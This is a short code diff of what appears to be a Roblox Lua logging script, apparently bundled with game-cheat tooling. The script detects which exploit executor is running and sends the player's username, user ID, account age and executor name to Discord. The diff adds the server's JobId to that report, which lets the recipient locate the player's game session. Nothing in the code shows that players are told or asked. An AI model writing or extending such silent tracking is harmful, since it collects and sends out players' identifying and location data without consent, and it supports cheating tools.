@@ -7,6 +7,9 @@ local username = player.Name
 local userId = player.UserId
 local accountAge = player.AccountAge
 
+-- Mendapatkan JobID server saat ini
+local jobId = game.JobId
+
 -- Deteksi executor yang digunakan
 local executor = "Unknown Executor" -- Default jika tidak terdeteksi
 
@@ -43,7 +46,7 @@ elseif Nezur then
 elseif AppleWare then
     executor = "AppleWare"
 elseif Macsploit then
-    executor = "Macsploit is best tbh"
+    executor = "Macsploit"
 elseif Xeno then
     executor = "Xeno"
 elseif Avernus then
@@ -73,7 +76,8 @@ local function sendToDiscord(message)
                 {["name"] = "User:", ["value"] = username, ["inline"] = false},
                 {["name"] = "User ID:", ["value"] = tostring(userId), ["inline"] = false},
                 {["name"] = "User Age:", ["value"] = tostring(accountAge), ["inline"] = false},
-                {["name"] = "Executor", ["value"] = executor, ["inline"] = false}
+                {["name"] = "Executor:", ["value"] = executor, ["inline"] = false},
+                {["name"] = "Job ID:", ["value"] = jobId, ["inline"] = false} -- Menambahkan informasi JobID
             },
             ["color"] = 16711680 -- Warna merah
         }}
